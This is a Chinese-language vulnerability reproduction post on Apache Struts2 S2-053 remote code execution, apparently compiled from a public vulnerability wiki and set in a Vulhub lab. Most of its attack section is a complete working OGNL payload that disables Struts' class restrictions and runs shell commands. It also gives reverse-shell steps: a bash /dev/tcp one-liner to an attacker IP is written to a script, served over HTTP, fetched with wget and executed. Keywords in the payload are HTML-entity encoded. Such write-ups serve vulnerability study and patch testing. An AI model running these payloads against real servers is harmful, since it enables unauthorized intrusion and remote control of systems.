---
title: "Apache Struts2 S2-053 远程代码执行漏洞"
date: 2026-10-14 09:04:00
categories:
  - WebSecurity
  - CVE
  - "中间件"
  - "Apache-Struts2"
tags:
  - "Apache-Struts2"
  - "命令执行"
  - "代码执行"
  - "漏洞复现"
---
## 漏洞描述

漏洞详情:

- http://struts.apache.org/docs/s2-053.html
- https://mp.weixin.qq.com/s?__biz=MzU0NTI4MDQwMQ==&mid=2247483663&idx=1&sn=6304e1469f23c33728ab5c73692b675e

## 漏洞影响

影响版本: Struts 2.0.1 - Struts 2.3.33, Struts 2.5 - Struts 2.5.10

## 环境搭建

Vulhub 执行以下命令启动 s2-053 测试环境：

```
docker-compose build
docker-compose up -d
```

环境运行后，访问 `http://your-ip:8080/hello.action` 即可看到一个提交页面。

## 漏洞复现

Struts2 在使用 Freemarker 模板引擎的时候，同时允许解析 OGNL 表达式。导致用户输入的数据本身不会被 OGNL 解析，但由于被 Freemarker 解析一次后变成离开一个表达式，被 OGNL 解析第二次，导致任意命令执行漏洞。

输入如下 Payload 即可成功执行命令（注意 Payload 末尾有一个换行）：

<details>
<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>

<pre><code class="language-text">%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'&#99;md.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.&#80;rocessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}
</code></pre>

</details>

![image-20220302132454688](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/middleware/images/202203021324760.png)

### 反弹 shell

编写 shell 脚本并启动 http 服务器：

<details>
<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>

<pre><code class="language-text">echo "&#98;ash -i &gt;&amp; &#47;dev/tcp/192.168.174.128/9999 0&gt;&amp;1" &gt; shell.sh
python3环境下：python -m http.server 80</code></pre>

</details>

上传 shell.sh 文件的命令为：

```
wget 192.168.174.128/shell.sh
```

上传 shell.sh 文件的 Payload 为：

![image-20220302132524059](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/middleware/images/202203021325134.png)

执行 shell.sh 文件的命令为：

```
bash shell.sh
```

执行 shell.sh 文件的 Payload 为：

![image-20220302132552428](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/middleware/images/202203021325509.png)

成功接收反弹 shell：

![image-20220302132603933](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/middleware/images/202203021326024.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/middleware/Apache-Struts2-S2-053-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md)
